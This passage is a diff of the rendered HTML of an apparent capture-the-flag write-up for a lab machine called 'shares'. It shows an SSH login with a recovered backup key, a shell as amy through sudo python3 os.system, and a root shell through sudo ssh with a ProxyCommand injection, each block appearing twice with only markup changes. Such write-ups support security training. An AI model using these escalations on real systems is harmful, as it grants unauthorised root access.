-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">3786</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bashrc
-</span></span><span style="display:flex;"><span>drw-r--r-- <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .cache
-</span></span><span style="display:flex;"><span>drw-r--r-- <span style="color:#bd93f9">3</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .gnupg
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">807</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .profile
-</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .ssh
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .sudo_as_admin_successful
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">7713</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .viminfo
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
+<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
+amir@shares:~$ ls -la
+total <span style="color:#bd93f9">40</span>
+drwxrwxr-x <span style="color:#bd93f9">5</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
+drwxr-xr-x <span style="color:#bd93f9">4</span> root root <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bash_history
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">220</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .bash_logout
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">3786</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bashrc
+drw-r--r-- <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .cache
+drw-r--r-- <span style="color:#bd93f9">3</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .gnupg
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">807</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .profile
+drwxrwxr-x <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .ssh
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .sudo_as_admin_successful
+-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">7713</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .viminfo
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="shell-as-amy">Shell as amy</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>amir@shares:~$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> amir on shares:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User amir may run the following commands on shares:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/pkexec
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/python3
-</span></span><span style="display:flex;"><span>amir@shares:~$ sudo -u amy /usr/bin/python3 -c <span style="color:#f1fa8c">&#39;import os; os.system(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style="display:flex;"><span>amy@shares:~$
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">amir@shares:~$ sudo -l
+Matching Defaults entries <span style="color:#ff79c6">for</span> amir on shares:
+    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
+
+User amir may run the following commands on shares:
+    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
+    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/pkexec
+    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/python3
+amir@shares:~$ sudo -u amy /usr/bin/python3 -c <span style="color:#f1fa8c">&#39;import os; os.system(&#34;/bin/bash&#34;)&#39;</span>
+amy@shares:~$
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="shell-as-root">Shell as root</h1>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>amy@shares:~$ sudo -l
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff79c6">for</span> amy on shares:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User amy may run the following commands on shares:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/ssh
-</span></span><span style="display:flex;"><span>amy@shares:~$ sudo /usr/bin/ssh -o <span style="color:#8be9fd;font-style:italic">ProxyCommand</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
-</span></span><span style="display:flex;"><span>root@shares:~# <span style="color:#8be9fd;font-style:italic">cd</span> /root
-</span></span><span style="display:flex;"><span>root@shares:/root# ls
-</span></span><span style="display:flex;"><span>system.txt
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">amy@shares:~$ sudo -l
+Matching Defaults entries <span style="color:#ff79c6">for</span> amy on shares:
+    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin
+
+User amy may run the following commands on shares:
+    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/ssh
+amy@shares:~$ sudo /usr/bin/ssh -o <span style="color:#8be9fd;font-style:italic">ProxyCommand</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
+root@shares:~# <span style="color:#8be9fd;font-style:italic">cd</span> /root
+root@shares:/root# ls
+system.txt
+</code></pre></td></tr></table>
 </div>
 </div>
       </div>
